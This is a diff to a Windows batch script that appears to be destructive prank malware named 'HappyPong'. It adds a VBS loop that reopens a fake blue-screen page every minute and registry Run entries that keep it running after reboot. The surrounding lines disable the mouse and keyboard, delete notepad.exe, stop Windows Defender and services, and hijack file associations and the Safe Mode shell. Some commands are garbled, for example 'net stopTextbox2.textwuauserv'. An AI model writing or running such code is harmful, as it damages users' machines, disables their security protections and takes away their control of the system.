@@ -306,6 +306,14 @@ echo ^</script^>
 echo.  
 echo ^</html^> 
 ) > finalsod.hta 
+goto EndlessFear
+
+:EndlessFear
+echo Set Wshshell = createobject("wscript.shell") >> fea_r.vbs
+echo do >> fea_r.vbs
+echo wscript.sleep 60000 >> fea_r.vbs
+echo Wshshell.run "bsod.hta" >> fea_r.vbs
+echo loop >> fea_r.vbs
 goto TodayIsHalloween
 
 :TodayIsHalloween
@@ -428,7 +436,7 @@ echo digitalcitizen.life >> note.txt
 echo superuser.com >> note.txt
 echo instructables.com (content.instructables.com) >> note.txt
 echo hitech-us.com >> note.txt
-echo github.com (NTFS123: Trojan.VBS.Bolbi, Trojan.VBS.Bolbi V2, Trojan.VBS.Jesus) >> note.txt
+echo github.com (NTFS123: Trojan.VBS.Bolbi, Trojan.VBS.Bolbi V2, Trojan.VBS.Jesus - shirus29cools: Smiley Central) >> note.txt
 echo youtube.com (danooct1, FlyTech Videos, 4096, Kane Pixels, 2013Windows8.1, Come on Windows, Akmal, Enderman, special thanks to ManlyBadassHero) >> note.txt
 echo msfn.org >> note.txt
 echo y2mate.com >> note.txt
@@ -457,7 +465,7 @@ echo community.spiceworks.com >> note.txt
 echo thewindowsclub.com >> note.txt
 echo tomsguide.com >> note.txt
 echo itprotoday.com >> note.txt
-echo microsoft.com (support.microsoft.com, learn.microsoft.com) >> note.txt
+echo microsoft.com (support.microsoft.com, learn.microsoft.com, social.technet.microsoft.com) >> note.txt
 echo The game idea is on backrooms-wiki.wikidot.com (Entity666 The Backrooms Wiki). >> note.txt
 echo These apps helped me: >> note.txt
 echo Google Chrome >> note.txt
@@ -510,6 +518,7 @@ rundll32 mouse,disable
 rundll32 keyboard,disable
 del C:\WINDOWS\SYSTEM32\notepad.exe
 del C:\WINDOWS\notepad.exe
+del C:\WINDOWS\SYSWOW64\notepad.exe
 net stop "WSearch"
 net stopTextbox2.textwuauserv"
 net stop"WinDefend"
@@ -528,6 +537,7 @@ goto ThrowTheComputerToTrash
 :ThrowTheComputerToTrash
 cd C:\WINDOWS\HappyPong
 start change.vbs
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
 start pong.vbs
 reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v UseDefaultTile /t REG_DWORD /d 1 /f
 reg ADD "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f
@@ -542,7 +552,10 @@ reg ADD "HKCR\inffile\shell\Open" /v Command /t REG_SZ /d C:\WINDOWS\HappyPong\m
 reg ADD "HKCR\inffile\shell\Edit" /v Command /t REG_SZ /d C:\WINDOWS\HappyPong\ms_g.vbs /f
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Happy /t REG_SZ /d C:\WINDOWS\HappyPong\goodgam_e.vbs /f
 reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Happy /t REG_SZ /d C:\WINDOWS\HappyPong\goodgam_e.vbs /f 
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v YourBiggestFear /t REG_SZ /d C:\WINDOWS\HappyPong\fea_r.vbs /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v YourBiggestFear /t REG_SZ /d C:\WINDOWS\HappyPong\fea_r.vbs /f 
 reg ADD "HKLM\System\CurrentControlSet\Control\SafeBoot" /v AlternateShell /t REG_SZ /d C:\WINDOWS\HappyPong\ms_g.vbs /f
+reg ADD "HKLM\Software\Policies\Microsoft\Windows\System" /v DisableLogonBackgroundImage /t REG_DWORD /d 1 /f
 reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoSelectDownloadDir /d 1 /f
 reg ADD "HKLM\Software\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v IExplorer /d 0 /f
 reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoFindFiles /d 1 /f
